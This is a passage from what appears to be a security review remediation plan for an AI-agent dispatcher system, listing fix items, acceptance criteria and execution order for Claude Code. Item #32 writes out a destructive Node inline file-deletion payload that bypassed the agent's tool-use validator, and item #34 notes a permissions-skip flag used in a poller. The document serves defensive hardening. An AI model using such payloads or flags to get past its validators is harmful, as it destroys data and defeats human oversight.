     - expected: usage text only; no report side effects.

29) **Analyzer noise management and scoped baselines**
   - Target files:
     - lint/security config and selected noisy modules
   - Required changes:
     - triage high-volume analyzer outputs (ruff/pyflakes/mypy/bandit) into actionable vs baseline debt.
     - add scoped suppressions only where justified, keep high-signal checks blocking.
   - Verify:
     - rerun analyzer bundle used in review.
     - expected: materially reduced noise floor; top findings map to real defects.

30) **Repository data-boundary policy alignment (memory/history/data tracking)**
   - Target files:
     - `.gitignore`, data placement conventions, and migration docs/scripts
   - Required changes:
     - decide and enforce what runtime/personal artifacts stay tracked vs ignored.
     - migrate volatile/personal artifacts to ignored roots where policy requires.
   - Verify:
     - `git ls-files memory history data` against desired policy profile.
     - expected: tracked surface matches declared security/operational intent.

Queue completion status (revised):
- Initial claim of full completion was premature.
- Additional residual themes are listed in `continued #10` below and should be queued before declaring closure.
- Treat closure as valid only after residual items are either implemented or explicitly accepted/deferred.

### Resume run (2026-04-10, continued #10: residual items after slow re-audit)

Residual count update:
- Previous estimate: ~18-22 unique themes after dedupe.
- Current queue coverage: #1-#30 + residual #31-#38 below.
- Remaining unqueued unique themes after this addendum: **0 by current evidence set** (subject to post-fix retest).

31) **Fix subprocess launcher portability for Claude worker execution on Windows**
   - Why this is separate:
     - Distinct from generic hook portability; this is worker runtime invocation path (`claude` resolving to `.cmd` and failing under list-form `subprocess.run`).
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` worker launch path
     - shared Claude subprocess helper if one exists
   - Required changes:
     - resolve executable path and invoke `.cmd` through `cmd /c` fallback (or equivalent robust launcher abstraction).
     - include command provenance in failure reason when spawn fails.
   - Verify:
     - rerun roundtrip task probe that previously hit `[WinError 2]` post-ISC.
     - expected: worker launch succeeds (or fails with explicit actionable command path details).

32) **Close Node inline destructive-command miss in Bash validator**
   - Why this is separate:
     - Specific bypass class (`node -e "require('fs').rmSync(...)"`) remains a concrete fuzz miss.
   - Target files:
     - `security/validators/validate_tool_use.py`
     - relevant defensive test file under `tests/defensive/`
   - Required changes:
     - strengthen destructive inline detection patterns for Node variants/minified forms.
   - Verify:
     - replay known bypass payload from `validator_fuzz_results.json`.
     - expected: decision becomes `block`.

33) **Resolve weekly-synthesis template vs active backlog ISC drift**
   - Why this is separate:
     - Operational anti-criterion drift between `orchestration/routines.json` and currently active routine backlog rows is a governance defect.
   - Target files:
     - `tools/scripts/jarvis_dispatcher.py` routine injection/update flow
     - `orchestration/routines.json` / backlog sync utility
   - Required changes:
     - enforce parity refresh when routine templates change; stale active rows should be updated or replaced.
   - Verify:
     - rerun parity probe comparing routine template verify commands vs active backlog rows.
     - expected: no weaker legacy verify entries remain for active `weekly-synthesis` rows.

34) **Remove dangerous permissions bypass in Slack poller path**
   - Why this is separate:
     - Security posture issue independent of rate-limit handling.
   - Target files:
     - `tools/scripts/slack_poller.py`
   - Required changes:
     - remove/replace `--dangerously-skip-permissions`; route through approved permission profile.
   - Verify:
     - command-line construction audit + functional smoke run.
     - expected: no dangerous permission skip flag in runtime invocation.

35) **Fix trust-topology pytest collection crash explicitly (not only general test rehab)**
   - Why this is separate:
     - This is a current high-impact test blocker (`SystemExit` at import) and should be tracked as first-class remediation.
   - Target files:
     - `tests/defensive/test_trust_topology.py`
   - Required changes:
     - eliminate module-level exits/side effects at import; keep script mode only under `if __name__ == "__main__":`.
   - Verify:
     - `pytest -xvs tests` (without ignore) should pass collection stage.

36) **Make `hook_session_cost` malformed-input handling telemetry-safe**
   - Why this is separate:
     - Distinct pipeline from `hook_events`; malformed JSON currently creates empty-session cost rows that distort vitals.
   - Target files:
     - `tools/scripts/hook_session_cost.py`
     - `tools/scripts/vitals_collector.py`
   - Required changes:
     - reject or explicitly tag malformed session-cost rows.
     - ensure vitals counters ignore invalid/empty-session rows (or report separately).
   - Verify:
     - malformed session-cost probe + vitals run.
     - expected: no session inflation from invalid rows.

37) **Backlog/routine verification hygiene automation**
   - Why this is separate:
     - Two related findings (`non-executable verify criteria`, `unschedulable routine verify commands`) need an explicit automated gate, not just one-off cleanup.
   - Target files:
     - `tools/scripts/lib/isc_common.py`
     - dispatcher enqueue/injection path
     - optional new verifier script in `_codex_scratch` promoted to tracked tooling
   - Required changes:
     - pre-admission validation for verify command executability/sanitization.
     - route bad verifies to manual review before they reach pending queue.
   - Verify:
     - rerun verify-command audit and ensure zero pending rows with `verifiable=0`.

38) **Document and enforce static-only gaps closure plan**
   - Why this is separate:
     - Static-only items (`semgrep unsupported runtime`, full schema writer-reader matrix deferred) need explicit closure workflow to avoid permanent blind spots.
   - Target files:
     - review process docs/runbook (location chosen by maintainer)
   - Required changes:
     - define alternate execution environment for semgrep pass (or replacement scanner).
     - define incremental plan for full writer-reader schema matrix, including owners and cadence.
   - Verify:
     - produce executable checklist with commands/environment and first successful run artifact.

### Resume run (2026-04-10, continued #11: slow-pass precision edits)

Purpose: remove ambiguity before Claude Code executes the queue. This section defines strict acceptance criteria, sequencing, and rollback rules.

#### A) Strict acceptance criteria (apply to every queue item #1-#38)

- **A1 | Repro-first gate**
  - Before modifying code for an item, run its listed probe(s) and capture current failing output.
  - If probe does not fail as documented, mark item as `repro-mismatch` and do not claim fixed.

- **A2 | Minimal-fix boundary**
  - Fix only files listed under the item unless a dependency forces broader change.
  - If additional files are required, append a note under the item with rationale.

- **A3 | Pass condition**
  - Item is complete only when all listed verify commands pass with expected state transitions.
  - “No crash” alone is insufficient where correctness/containment semantics are required.

- **A4 | Regression guard**
  - After each item, re-run the nearest related probes from earlier completed items in the same domain:
    - Path safety domain: #1, #2, #25
    - Queue/dispatcher domain: #3, #4, #5, #16, #24
    - Validator/security domain: #11, #12, #13, #20, #32
    - Routine domain: #8, #17, #33
    - Telemetry domain: #9, #19, #26, #36

- **A5 | Evidence artifact**
  - For each item, write one JSON result artifact to `_codex_scratch/review_closure/` named:
    - `item-<N>-result.json`
  - Must include:
    - `item_id`, `before_probe`, `after_probe`, `status` (`fixed` | `partial` | `blocked`), and `notes`.

#### B) Execution order constraints (do not reorder)

1. **Security boundary first**: #1, #2, #11, #12, #13, #32, #34
2. **Verifier integrity second**: #3, #15, #20, #38
3. **Dispatcher liveness/crash third**: #4, #5, #16, #17, #24, #25
4. **State/routine correctness fourth**: #7, #8, #33, #37
5. **Telemetry/reporting fifth**: #9, #19, #26, #36
6. **Platform/debt cleanup last**: #10, #14, #18, #21, #22, #23, #27, #28, #29, #30, #31, #35

Rationale:
- Prevents low-risk cleanup from masking unresolved high-risk exploit classes.
- Ensures later domain checks rely on hardened earlier boundaries.

#### C) Item-specific precision upgrades (clarifications)

- **For #1/#2 path containment fixes**
  - Acceptance requires both:
    - no outside-root file creation,
    - and sanitized IDs still preserved inside JSON payload fields (no data loss of original id semantics).

- **For #3 verifier hardening**
  - Distinguish `SKIP` reasons:
    - allowed only for explicitly time-window-gated checks with valid data-shape.
    - malformed input/data-gap in required evidence path must be `FAIL` (nonzero exit).

- **For #4 dispatcher livelock**
  - Acceptance requires:
    - skipped-permanent tasks transition out of `pending` in first dispatcher run,
    - notifier/event text reflects that terminal routing reason.

- **For #5 malformed backlog handling**
  - “Skip bad row” must emit durable signal (event or log) with line index + reason.
  - Silent skip is not acceptable.

- **For #6 context file guards**
  - Block decision must happen before prompt assembly and before task selection eligibility.
  - It is insufficient to block only at prompt-read time.

- **For #7 follow-on state**
  - Concurrency acceptance target: `lost_updates=0` for race probes under documented stress parameters.
  - If filesystem-level contention cannot guarantee this, item remains `partial` and requires architecture change (single writer / transactional store).

- **For #8 routine injection**
  - Per-routine error isolation must prove “bad one does not block good ones” in same cycle.

- **For #9/#26 hook events**
  - Malformed payload must never be recorded as `success=true` event.
  - Empty tool names must be excluded from top-tool ranking at reader layer even if legacy rows exist.

- **For #14 cp1252**
  - “No hard crash” + “no replacement glyph on critical operator lines” required; both conditions must pass.

- **For #18 duplicate backlog IDs**
  - Migration should preserve dependency graph semantics (no silent dependency edge break).
  - Add migration dry-run mode and backup file output.

#### D) Risk flags to keep visible during implementation

- **R1**: Path sanitization can break legacy task IDs containing separators; require migration mapping if encountered.
- **R2**: Tightening verifier fail-closed logic may initially fail many scheduled jobs; rollout should include staged enforcement mode.
- **R3**: Event schema tightening may reduce historical comparability; keep a compatibility reader for old rows.
- **R4**: Routine schema validation may disable misconfigured routines; emit explicit operator-facing diagnostics.

#### E) Revised completion rule (final)

Do **not** declare review complete until:
1) all items #1-#38 are marked `fixed` or explicitly `accepted-risk` with owner + rationale, and  
2) domain regression bundle passes once in a clean sandbox run, and  
3) `REVIEW.md` has one closure table summarizing status by item id.
